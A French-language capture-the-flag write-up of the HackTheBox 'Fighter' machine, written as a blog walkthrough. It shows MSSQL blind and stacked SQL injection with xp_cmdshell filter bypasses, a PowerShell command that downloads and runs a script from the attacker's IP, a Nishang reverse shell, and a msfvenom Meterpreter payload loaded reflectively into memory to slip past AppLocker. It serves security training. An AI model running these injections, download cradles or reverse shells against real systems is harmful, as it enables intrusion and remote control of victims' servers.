# Solution du CTF Fighter de HackTheBox

Opening credits
---------------

Le CTF Fighter de [Hack The Box](https://www.hackthebox.eu/) fait partie de ces CTFs qui sont de véritables casse têtes sur lesquels on s'arrache les cheveux.  

Les restrictions mises en place sur le système forcent les participants à garder un niveau de furtivité dont on ne se soucie d'habitude pas sur un CTF.  

Le chemin a donc été long mais a permis de découvrir de nouveaux outils, techniques et astuces.  

Ce CTF a aussi finit de me convaincre qu'il faut que j'apprenne le langage PowerShell :D   

Round 1, Fight !
----------------

Un scan sur l'IP 10.10.10.72 ne nous apporte rien de plus que le port 80 ouvert.  

Il s'agit d'un IIS 8.5, powered-by ASP.NET d'après les entêtes HTTP.  

Le site a tout d'un *Wordpress* mais les liens renvoient tous à la seule page d'index. Les dossiers *wp-admin* et *wp-content* n'existent pas, il s'agit en fait d'une page statique sans réel intérêt.  

Le contenu donne le thème central du CTF, puisque le site se présente comme le *Street Fighter Club*, un site pour les fans du jeu vidéo de *Capcom*. Les auteurs des posts sur le site sont d'ailleurs des personnages du jeu.  

![HackTheBox Fighter Homepage](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/fighter_homepage.png.jpg)

La dernière annonce sur le site fait mention du domaine *streetfighterclub.htb* ainsi que l'existence de la vieille version du site pour les membres déplacée à un emplacement qui n'est lui pas mentionné.  

Retrouver l'espace membres a été aisé, j'ai seulement forgé l'entête HTTP Host et comparé la somme md5 du body des réponses :  

```plain
devloop@kali:~$ curl -H "Host: streetfighterclub.htb" http://10.10.10.72/ |md5sum
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6911  100  6911    0     0  95986      0 --:--:-- --:--:-- --:--:--  112k
2b0d3b985f4fcdc08bf07290a1d56037  -
devloop@kali:~$ curl -H "Host: members.streetfighterclub.htb" http://10.10.10.72/ |md5sum
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1233  100  1233    0     0   4003      0 --:--:-- --:--:-- --:--:--  4029
11ca4578cb026a23713aea6781b8ece3  -
devloop@kali:~$ curl -H "Host: mesmbers.streetfighterclub.htb" http://10.10.10.72/ |md5sum
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6911  100  6911    0     0  77651      0 --:--:-- --:--:-- --:--:-- 86387
2b0d3b985f4fcdc08bf07290a1d56037  -
```

On voit ici clairement un contenu différent du contenu par défaut quand on spécifie l'hôte *members.streetfighterclub.htb*.  

Une ligne dans le fichier */etc/hosts* plus tard et on obtient une erreur 403 *You do not have permission to view this directory or page using the credentials that you supplied.* quand on accède à l'index de ce domaine.  

Cela nous incite à lancer un dir-buster quelconque qui nous remonte rapidement le dossier */old* à la racine.  

Dans ce dossier on trouve ensuite une page de login (*login.asp*) qui envoie les identifiants vers le script *verify.asp* et enfin il y a un script *welcome.asp* qui est sans doute la page sur laquelle on atterrit si l'on saisit des identifiants valides.  

J'ai écrit un script Python rapide pour tester des identifiants possibles (noms d'utilisateurs classiques du type admin, test, web... ainsi que les personnages du jeu) :  

```python
import sys

import requests
from requests.exceptions import RequestException

user_file = sys.argv[1]
pass_file = sys.argv[2]

sess = requests.session()

with open(user_file) as fd:
    for username in fd:
        print("Trying user", username)
        username = username.strip()

        with open(pass_file) as fd2:
            for password in fd2:
                password = password.strip()

                for login_type in (1, 2):
                    try:
                        response = sess.post(
                            "http://members.streetfighterclub.htb/old/verify.asp",
                            data={"username": username, "password": password, "logintype": login_type, "B1": "LogIn"},
                            headers={"referer": "http://members.streetfighterclub.htb/old/Login.asp"},
                            allow_redirects=True,
                            timeout=10
                        )
                    except RequestException as exception:
                        print(exception)
                    else:
                        if "rememberme" not in response.text:
                            print("Special case with {} / {} (type {})".format(username, password, login_type))
                            sess = requests.session()
```

J'aurais tout aussi bien pu utiliser [Patator](https://github.com/lanjelot/patator) ou [Hydra](https://github.com/vanhauser-thc/thc-hydra) au vu de la faible complexité de l'authentification.  

```plain
Trying user chun-li
Trying user ryu
Trying user blanka
Trying user chunli
Trying user guile
Trying user ken
Trying user bison
Trying user vega
Trying user balrog
Trying user sagat
Trying user zangief
Trying user dhalsim
Trying user honda
Trying user admin
Special case with admin / test (type 1)
Trying user streetfighter
Trying user capcom
```

Malheureusement la saisie de ces identifiants ne nous apporte rien de plus que le message *ERROR: Service not available* :'(  

Devant ce piètre résultat je me suis ensuite penché sur le format des cookies obtenus qui contient des valeurs encodées en base64 :  

```plain
Email=YWRtaW5Abm93aGVyZS5jb20%3D; path=/Level=MQ%3D%3D; path=/Chk=6253; path=/password=dGVzdA%3D%3D; expires=Sun, 02-Jun-2019 12:07:06 GMT; path=/username=YWRtaW4%3D; expires=Sun, 02-Jun-2019 12:07:06 GMT; path=/
```

Malheureusement après avoir tenté différentes attaques d'injection (via [ZAP Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)) sur ces valeurs, force est de constater que je faisais fausse route.  

Je me suis alors attaqué tout simplement aux paramètres du formulaire de login et en testant les différents champs il apparaît que le *logintype* a un comportement particulier et provoque des erreurs HTTP 500 si on sort un peu des sentiers battus. On serait donc en présence d'une faille d'injection SQL en aveugle.  

J'ai insisté dans cette direction et finalement trouvé le nombre de colonnes de la table courante (6) en augmentant le nombre d'entrées NULL dans une requête UNION :  

```plain
username=admin&password=test&logintype=1%20union%20select%20null,null,null,null,null,null&rememberme=ON&B1=LogIn
```

Ici victoire, le serveur nous retourne un code de statut 200 :)   

Si on remplace l'un des NULL par *version()* on reçoit une erreur 500. Ce n'est pas le cas avec *@@version* ce qui signifie que la base de données est du Microsoft SQL ([le mot clé](https://docs.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql-configuration-functions?view=sql-server-2017) est spécifique).  

L'autre particularité observée avec *ZAP Proxy* c'est que lors de l'envoi d'une requête de login, si cette dernière réussi, le cookie obtenu nous *colle à la peau* et fausse la suite des attaques. Il faut alors avoir recours à l'option *--drop-set-cookie* lorsque l'on lance *SQLmap*.  

Mais lors du lancement de ce dernier... nada. On est redirigé vers la page d'authentification. Cela est vite bypassé en utilisant l'option *--random-agent* (par défaut SQLMap envoie son nom dans le user-agent, ce qui fait le bonheur des IDS/IPS/WAF).  

On s'en sort finalement avec la commande suivante :  

```plain
devloop@kali:~$ sqlmap -u 'http://members.streetfighterclub.htb/old/verify.asp' --referer 'http://members.streetfighterclub.htb/old/login.asp' --data 'username=admin&password=test&logintype=1&rememberme=ON&B1=LogIn' --risk 3 --level 5 -p logintype --dbms mssql --drop-set-cookie --random-agent --string "ERROR: Service not available"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 14:17:26

[14:17:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51' from file '/usr/share/sqlmap/txt/user-agents.txt'
[14:17:27] [INFO] testing connection to the target URL
[14:17:27] [INFO] heuristics detected web page charset 'ascii'
sqlmap got a 302 redirect to 'http://members.streetfighterclub.htb:80/old/welcome.asp'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
[14:18:06] [INFO] testing if the provided string is within the target URL page content
[14:18:06] [WARNING] heuristic (basic) test shows that POST parameter 'logintype' might not be injectable
[14:18:06] [INFO] testing for SQL injection on POST parameter 'logintype'
[14:18:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[14:18:07] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[14:18:08] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[14:18:08] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[14:18:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:18:08] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[14:18:09] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[14:18:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[14:18:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[14:18:09] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[14:18:10] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)'
[14:18:10] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)'
[14:18:11] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)'
[14:18:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)'
[14:18:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:18:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:18:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:18:11] [INFO] target URL appears to have 6 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[14:18:22] [INFO] target URL appears to be UNION injectable with 6 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[14:18:30] [INFO] testing 'Generic UNION query (74) - 21 to 40 columns'
[14:18:32] [INFO] testing 'Generic UNION query (74) - 41 to 60 columns'
[14:18:33] [INFO] testing 'Generic UNION query (74) - 61 to 80 columns'
[14:18:34] [INFO] testing 'Generic UNION query (74) - 81 to 100 columns'
[14:18:35] [INFO] checking if the injection point on POST parameter 'logintype' is a false positive
POST parameter 'logintype' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 265 HTTP(s) requests:
---
Parameter: logintype (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin&password=test&logintype=1 AND 8424=8424&rememberme=ON&B1=LogIn
---
[14:18:41] [INFO] testing Microsoft SQL Server
[14:18:42] [INFO] confirming Microsoft SQL Server
[14:18:42] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 8.1 or 2012 R2
web application technology: ASP.NET, Microsoft IIS 8.5, ASP
back-end DBMS: Microsoft SQL Server 2012
[14:18:42] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 188 times
[14:18:42] [INFO] fetched data logged to text files under '/home/devloop/.sqlmap/output/members.streetfighterclub.htb'

[*] shutting down at 14:18:42
```

*SQLmap* a bien retrouvé l'injection, à savoir une injection SQL en aveugle de type booléen avec la possibilité d'utiliser UNION sur 6 colonnes. En revanche il ne semble pas possible d'enchaîner (stack) les requêtes (mettre un point virgule suivi d'une autre requête SQL), ce qui est pourtant souvent le cas avec MSSQL :(   

Voici différentes informations que j'ai récupéré sur la machine en jouant avec les différentes options de *SQLmap* :  

```plain
available databases [5]:
[*] master
[*] model
[*] msdb
[*] tempdb
[*] web

current user:    'web'

Database: web
Table: _logins
[1 entry]
+------+-------+------+-------+----+-------------------+
| id   | _u    | _p   | _n    | _l | _e                |
+------+-------+------+-------+----+-------------------+
| NULL | admin | test | Admin | 1  | admin@nowhere.com |
+------+-------+------+-------+----+-------------------+

database management system users [16]:
[*] ##MS_AgentSigningCertificate##
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] BUILTIN\Users
[*] FIGHTER\Administrator
[*] NT AUTHORITY\SYSTEM
[*] NT Service\MSSQL$SQLEXPRESS
[*] NT SERVICE\SQLWriter
[*] NT SERVICE\Winmgmt
[*] sa
[*] web

hostname:    'FIGHTER\SQLEXPRESS'

web server operating system: Windows 8.1 or 2012 R2
web application technology: ASP.NET, Microsoft IIS 8.5, ASP
back-end DBMS: Microsoft SQL Server 2012
```

Pour une raison inconnue, l'extraction des hashs des comptes SQL (via *--passwords*) ne fonctionnait pas mais en tapant la requête SQL directement (via l'invite obtenue avec l'option *--sql-shell*) cela fonctionne :  

```plain
select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins [4]:
[*] ##MS_PolicyEventProcessingLogin##, 0x0200bf9a95d75104265eb3ba0c429ffe6ca446d8d2445aaedd285e7d932b18e08329e946a00f22a0da6bba80239c0877c986f90db8f008267fe528dff1c9b97e3f1770cf4332
[*] ##MS_PolicyTsqlExecutionLogin##, 0x02001a73788fcdcd9b341e140c8e24c22de85913c9107bbe0d662b5fc2ff523cfefb0961d578993e841d53326df4afc1d91c405ba833b84dd86f6c872272e5a17a1afea59fde
[*] sa, 0x02006de6346acaf2178e53a4e1f4f1d4076f6bbb11719a045a01ad0c6ecfc78287162469199dcaf6e22e16221ec8369f7e70e7734a3922d0e77b24668bbeb93fc97de6e901eb
[*] web, 0x02009aed2fa5bd9aa14ca90e514ed5f8b3c0050b97826bad92f979fa28f2870d2c590beefe22b329571827b5c06c6a3f952ebdf38bd14a5957dc07c8ace40e76e52c84bd2a09
```

Malheureusement les tentatives de casser ces hashs ont échouées, nous laissant supposer qu'une fois de plus on était sur le mauvais chemin.  

Hadouken
--------

Il est alors temps de se pencher sérieusement sur les stacked-queries et le résultat est prometteur.  

Ainsi si on passe la requête *;SELECT @@version* on obtient la réponse espérée (pas d'erreur interne au serveur) alors qu'avec *;SELECT version()* (qui est spécifique MySQL) on obtient une erreur 500. *SQLmap* semble donc se tromper en ne voyant pas la possibilité de stack-er les requêtes...  

L'étape évidente suivante est de se servir de [xp\_cmdshell](https://docs.microsoft.com/fr-fr/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017) pour exécuter des commandes sur le serveur... mais ça ne marche pas :| Même en appelant préalablement *sp\_reconfigure* (voir [cette cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) pour les différentes astuces possibles).  

Ce CTF nous fait la vie dure ! Du coup on peut se reporter aux autres fonctionnalités de MSSQL comme [BULK INSERT](https://docs.microsoft.com/fr-fr/sql/t-sql/statements/bulk-insert-transact-sql?view=sql-server-2017) pour lire le contenu de fichiers et voir où cela nous mène.  

J'ai écrit le script *stacked.py* qui m'a servi de squelette pour placer les différentes commandes à exécuter tout au long du CTF. L'exemple suivant permet de charger le contenu du fichier *win.ini* dans la table *yoloout2* que l'on a préalablement créé après s'être octroyé les droits *BULK INSERT* :  

```python
from urllib.parse import quote
import requests
from time import sleep

data = {
    "username": "admin",
    "password": "test",
    "logintype": 1,
    "rememberme": "ON",
    "B1": "LogIn"
}

cmds = [
        "1;ALTER SERVER ROLE bulkadmin ADD MEMBER web;",
        "1;DROP TABLE yoloout2; CREATE TABLE yoloout2 (content nvarchar(4000)); BULK INSERT yoloout2 FROM 'c:\\windows\\win.ini';"
]

for cmd in cmds:
    data["logintype"] = cmd

    response = requests.post(
        "http://members.streetfighterclub.htb/old/verify.asp",
        headers={"Referer": "http://members.streetfighterclub.htb/old/login.asp"},
        data=data,
        allow_redirects=False
    )

    print(response.status_code, cmd)
    sleep(0.1)
```

Pour récupérer le contenu de la table (et donc le contenu du fichier) il suffit d'utiliser les options *-D web -T yoloout2 --dump* de *SQLmap* :  

```plain
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Armé de cette nouvelle fonctionnalité je me suis efforcé d'obtenir le contenu du fichier *applicationhost.config* qui est un peu le *httpd.conf* ou *apache2.conf* d'IIS. Malheureusement la récupération de ce fichier normalement situé dans *system32\inetsrv* ou *system32\inetsrv\config* a échoué. Je suppose que l'accès à ce fichier est soit refusé soit bloqué car déjà ouvert par IIS...  

L'objectif était de retrouver l'emplacement exact de la racine web sur le serveur qui de toute évidence n'était pas exactement *c:\inetpub\wwwroot*.

Shoruyken
---------

A ce stade toujours pas de *xp\_cmdshell*, mais qu'en est-il des autres procédures xp\_\* ?  

MSSQL dispose de deux procédures de listing de dossiers qui ne sont pas documentées : *xp\_subdirs* et *xp\_dirtree*.  

Avec la requête *DROP TABLE yoloout2; CREATE TABLE yoloout2 (subdir varchar(512)); INSERT INTO yoloout2 EXEC master.dbo.xp\_subdirs 'c:\inetpub';* on crée une table dont les entrées sont les noms des sous-dossiers de *inetpub* :

```plain
Database: web
Table: YOLOOUT2
[5 entries]
+---------+
| SUBDIR  |
+---------+
| custerr |
| history |
| logs    |
| temp    |
| wwwroot |
+---------+
```

Enfin ! On répète l'opération pour *wwwroot* :  

```plain
+---------------+
| SUBDIR        |
+---------------+
| aspnet_client |
| css           |
| images        |
| members       |
| street        |
+---------------+
```

On en déduit que les scripts ASP sont situés dans *c:\inetpub\wwwroot\members\old*. On peut dès à présent dumper le contenu de *verify.asp* :  

```plain
<%
--- snip ---
Dim Conn
Dim SQLQuery
Dim rs
Dim UserName
Dim Password
Dim LoginType

Randomize
RememberMe = request.form("rememberme")
Response.Cookies("Chk")="" & Int((10000-100+1)*Rnd+100)
UserName=request("username")
Password=request("password")
LoginType=request("logintype")
Session("LoginOK")=False

if instr(ucase(request.servervariables("HTTP_USER_AGENT")),"SQLMAP") > 0 then
    Response.Redirect "login.asp"
    Response.End
end if

if UserName <> "" or Password <> "" then
    set Conn=server.createobject("ADODB.Connection")
    set rs = Server.CreateObject("ADODB.Recordset")
    connStr="DSN=test;user id=web;password=zappone2017!;initial catalog=web"
    Conn.open  connStr

    SQLQuery = "select * from _logins where _u = '"& replace(UserName,"'","''") &"' AND _p = '" & replace(Password,"'","''") & "'  AND _l=" & Logintype
     'SQLQuery = "select * from _logins where _u = '"& UserName &"' AND _p = '" & replace(Password,"'","''") & "'  AND _l=" & Logintype
    Session("LoginOK")=False
    SQLQuery=replace(SQLQuery,"XP_CMDSHELL","")
        SQLQuery=replace(SQLQuery,"xp_cmdshell","")
    SQLQuery=lcase(sqlquery)

    SQLQuery=replace(SQLQuery,"/*","")
    SQLQuery=replace(SQLQuery,"#","")
    SQLQuery=replace(ucase(SQLQuery),"WAITFOR DELAY","")
        SQLQuery=replace(ucase(SQLQuery),"CASE","")
        SQLQuery=replace(ucase(SQLQuery),"WHEN","")
        SQLQuery=replace(ucase(SQLQuery),"ELSE","")
        SQLQuery=replace(ucase(SQLQuery),"REPLACE","")

    set rs=Conn.execute(SQLQuery)
    if rs.BOF and rs.EOF then
            Response.Cookies("UserName")=Base64Encode(UserName)
            Response.Cookies("Password")=Base64Encode(Password)
            Response.Cookies("Level")="-1"
            Response.Cookies("Email")=""

    else
        Session("LoginOK")=True

        if RememberMe = "ON" then
            'Writing cookies permanently
            Response.Cookies("UserName")=Base64Encode(UserName)
            Response.Cookies("Password")=Base64Encode(Password)
            Response.Cookies("Level")=Base64Encode(cstr(rs("_l")))
            Response.Cookies("Email")=Base64Encode(rs("_e"))

            Response.Cookies("UserName").Expires = Now() + 365
            Response.Cookies("Password").Expires = Now() + 365
            Response.Redirect "welcome.asp"
        end if

    end if
    rs.close
    set rs = nothing
    Conn.Close
    set Conn = nothing
    Response.Redirect "Welcome.asp"
    Response.End
else
    'Invalid User

    Response.Redirect "login.asp"
end if
NULL
%>
```

On comprend alors les difficultés que l'on avait à faire exécuter *xp\_cmdshell* : la chaîne est retiré de la requête forgée avant son exécution. Celà est toutefois facilement bypassable en mettant au moins une des lettres en majuscule.  

De la même façon on peut bypasser le retrait de *WAITFOR DELAY* en rajoutant un espace supplémentaire entre ces deux mots et pour *CASE* ou peut par exemple envoyer *CACASESE* (ou *CCASEASE*... whatever)  

Ecrire un script Tamper pour sqlmap pourrait s'avérer utile mais j'ai préféré continuer avec mon script perso :)  

Maintenant il faudrait pouvoir faire exécuter une backdoor sur le système. Le plus simple est d'utiliser *impacket-smbserver* pour créer un partage SMB et de simplement passer le chemin [UNC](https://fr.wikipedia.org/wiki/Universal_Naming_Convention) de notre exécutable à *xp\_cmdshell*. En cas d'antivirus on peut même avoir recours à [Shellter](https://www.shellterproject.com/) pour passer inaperçu.  

Mais une fois de plus c'est voué à l'échec... Les règles du pare-feu empêchent visiblement le trafic SMB.  

La stacked-query suivante effectue un scan de port sortant vers ma machine :  

```python
1;EXEC master..xP_Cmdshell 'c:/windows/syswow64/windowspowershell/v1.0/powershell.exe -nop -exec bypass -c "1..65535 | % { echo ((New-Object Net.Sockets.TcpClient).Connect(\"10.10.15.208\", $_)) \"$_ is open\" } 2> $null"';
```

Et là l'orage fait place au soleil :  

```plain
Capturing on 'tun0'
    1 0.000000000  10.10.10.72 → 10.10.15.208 TCP 52 49694 → 443 [SYN, ECN, CWR] Seq=0 Win=8192 Len=0 MSS=1357 WS=256 SACK_PERM=1
    2 0.000016130 10.10.15.208 → 10.10.10.72  TCP 40 443 → 49694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
    3 0.539965114  10.10.10.72 → 10.10.15.208 TCP 52 [TCP Retransmission] 49694 → 443 [SYN] Seq=0 Win=8192 Len=0 MSS=1357 WS=256 SACK_PERM=1
    4 0.539981248 10.10.15.208 → 10.10.10.72  TCP 40 443 → 49694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
    5 1.068069720  10.10.10.72 → 10.10.15.208 TCP 48 [TCP Retransmission] 49694 → 443 [SYN] Seq=0 Win=8192 Len=0 MSS=1357 SACK_PERM=1
    6 1.068086110 10.10.15.208 → 10.10.10.72  TCP 40 443 → 49694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

Le firewall nous autorise uniquement une sortie sur le port 443... C'est peu mais on fera avec :)  

On serait bien tenté d'utiliser la méthode *DownloadFile* de PowerShell pour placer notre backdoor puis l'exécuter sauf que même en utilisant le port 443 les reverse shell n'aboutissent pas. Même en combinant un payload https avec Shellter rien ne semble passer... L'antivirus doit être costaud...  

J'ai eu recours au script [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) de *Nishang* pour obtenir un reverse-powershell sur le port 443.  

Il faut au préalable rajouter la commande powershell à la fin du fichier pour appeler la fonction de reverse shell avec notre adresse IP et port :  

```plain
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.251 -Port 443
```

Comment avoir le même port pour envoyer le script PowerShell lors de la requête web et recevoir notre reverse shell ? Il y a sans doute des solutions compliquées (load-balancing via inspection du contenu) mais j'ai opté pour faire deux écoutes de port consécutives avec *Ncat*.  

La réponse du premier *Ncat* doit se substituer à un serveur web, il faut donc envoyer des entêtes HTTP en plus du script powershell. Pour générer le fichier de la réponse HTTP brute on peut lancer un serveur web rapide :  

```bash
python3 -m http.server
```

et on dumpe la réponse via curl :  

```bash
curl -D- http://127.0.0.1/Invoke-PowerShellTcp.ps1 > reverse_shell_response.txt
```

Les requêtes SQL stacked ressemblent maintenant à ceci (certaines sont surement superflues, je n'ai pas fait le tri) :  

```python
cmds = [
        "1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;",
        "1;EXEC sp_configure 'show advanced options',1;EXEC sp_configure reconfigure;",
        "1;EXEC sp_configure'xP_cMdshell',1;RECONFIGURE;",
        "1;EXEC sp_configure 'OLE Automation Procedures',1;EXEC sp_configure reconfigure;",
        "1;EXEC sp_configure 'ad hoc distributed queries',1;EXEC sp_configure reconfigure;",
        "1;EXEC sp_configure 'clr enabled',1;EXEC sp_configure reconfigure;",
        "1;ALTER SERVER ROLE bulkadmin ADD MEMBER web;",
        "1;GRANT EXECUTE ON master.sys.xP_cmDshell TO web;",
        "1;EXEC master..xP_Cmdshell 'c:/windows/syswow64/windowspowershell/v1.0/powershell.exe -nop -exec bypass -c \"IEX (New-Object System.Net.WebClient).DownloadString(\\\"http://10.10.15.251:443/revshell.ps1\\\")\"';"
]
```

Et ça mort à l'hameçon :  

![HackTeBox Fighter unprivileged reverse shell](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/fighter_first_shell.png)

Round 2, Fight !
----------------

Un *systeminfo* révèle un Windows 2012 R2 avec 159 correctifs appliqués, *\*gloups\** :  

```plain
Host Name:                 FIGHTER
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA535
Original Install Date:     19/10/2017, 22:31:21
System Boot Time:          02/08/2018, 06:04:03
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
                           [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             it;Italian (Italy)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
Total Physical Memory:     4.096 MB
Available Physical Memory: 1.136 MB
Virtual Memory: Max Size:  4.800 MB
Virtual Memory: Available: 1.672 MB
Virtual Memory: In Use:    3.128 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 159 Hotfix(s) Installed.
```

En jouant avec notre invite de commande pour tenter de rapatrier des scripts et exécutables divers j'ai compris que la protection qui empêche de déposer un exécutable est plus du type *AppLocker* que antivirus : si on place une image PNG anodine sur le système, aucun problème, en revanche si on tente de renommer la même image avec certaines extensions (exe, bat, ps1, scr, etc) on obtient un *Access denied*.  

Tatsumaki Senpukyaku
--------------------

Comment faire exécuter un fichier .exe sur un système si on ne peut pas y placer d'exécutable ? En l'exécutant directement en mémoire bien sûr !  

Pour cela on utilise le script [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) qui va charger via réflexion un Meterpreter dans la mémoire de notre process Powershell.  

J'ai écrit le script bash suivant pour générer le PS1 :  

```bash
#!/bin/bash
IP=$(ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
mkdir -p /tmp/jail
echo "Creating reverse shell for IP $IP..."
msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$IP LPORT=443 RC4PASSWORD=fuckit -f exe -o /tmp/jail/reverse_met.exe
base64 -w 0 /tmp/jail/reverse_met.exe > /tmp/jail/reverse_met.b64

echo "Putting base64 in powershell script"
echo -n '$InputString = "' > /tmp/jail/reflection.ps1
cat /tmp/jail/reverse_met.b64 >> /tmp/jail/reflection.ps1
echo '"' >> /tmp/jail/reflection.ps1

echo "Appending Invoke-ReflectivePEInjection"
cat Invoke-ReflectivePEInjection.ps1 >> /tmp/jail/reflection.ps1
echo >> /tmp/jail/reflection.ps1
echo >> /tmp/jail/reflection.ps1

echo "Appending Invoke call"
echo '$PEBytes = [System.Convert]::FromBase64String($InputString)' >> /tmp/jail/reflection.ps1
echo 'Start-Sleep -s 20' >> /tmp/jail/reflection.ps1
echo 'Invoke-ReflectivePEInjection -PEBytes $PEBytes' >> /tmp/jail/reflection.ps1
echo 'Start-Sleep -s 600' >> /tmp/jail/reflection.ps1
mv /tmp/jail/reflection.ps1 /tmp/jail/REFLECTION.PS1
```

Les 20 secondes d'attente dans le script nous laissent le temps de stopper le serveur web une fois le script Powershell téléchargé par la cible et de lancer le handler Metasploit.  

Et ça marche :  

```plain
[*] Started reverse TCP handler on 10.10.15.59:443
msf exploit(multi/handler) > [*] Sending stage (179783 bytes) to 10.10.10.72
[*] Meterpreter session 1 opened (10.10.15.59:443 -> 10.10.10.72:49172) at 2018-08-18 14:34:27 +0200

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: FIGHTER\sqlserv
meterpreter > sysinfo
Computer        : FIGHTER
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : it_IT
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

Sauf que l'on dispose d'une session Meterpreter x86 alors que le système est x64 :|  

Si on lance un ps depuis la session obtenue on voit bien le process *sqlservr.exe* tournant en x64 pourtant si on tente de lancer powershell via le path system32 ou sysnative, nada, notre script n'est pas téléchargé... C'est pour cela que l'on a pas le choix de se retrouver avec une session x86 :'(  

La migration vers un process x64 n'aboutit pas et dans notre cas, avec notre port unique, utiliser *payload\_inject* ne semble pas être une solution possible.  

J'ai préféré mettre de côté ce problème pour le moment et explorer un peu le système.  

